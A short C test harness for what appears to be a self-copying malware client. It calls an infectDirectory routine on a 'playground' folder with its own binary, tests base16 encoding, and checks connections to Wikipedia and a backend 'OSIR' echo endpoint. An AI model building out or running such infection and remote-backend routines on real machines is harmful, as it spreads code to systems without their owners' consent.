#include "../../client/common/clonelib.h"
#include "../../client/common/web.h"
#include "../../client/common/common.h"
#include <stdio.h>

int main(int argc, char** argv){argc=argc;
	const char* test_string="Hungry\x00\xff\n Hippo!";
	int status;

	//Test function infectDirectory
	printf("Test Status(infectDirectory):\t%s\n",infectDirectory("playground",argv[0])?"OK":"Failed");
	
	//Test functions b16decode and b16encode
	status=strcmp(b16decode(b16encode(test_string,strlen(test_string))),test_string);
	printf("Test Status(b16en/decrypt):\t%s",status?"Failed":"OK");
	if(status)printf("(%d)",status);printf("\n");
	
	//Test encryption/decrption
	
	//Check internet connection
	char** reply;
	status=sendHTTPRequest(reply,"208.80.154.224","GET /wiki/Main_Page http/1.1\r\nHost: en.wikipedia.org\r\n\r\n");
	printf("Connection Status(wikipedia):\t%s\n",status?"OK":"Failed");
	
	//Check backend connection
	printf("Connection Status(OSIR):\t%s\n",getHypertext(SERVER_OSIR_HOME "/client-interface/echo.php?arg=OK"));
	
	return 0;
}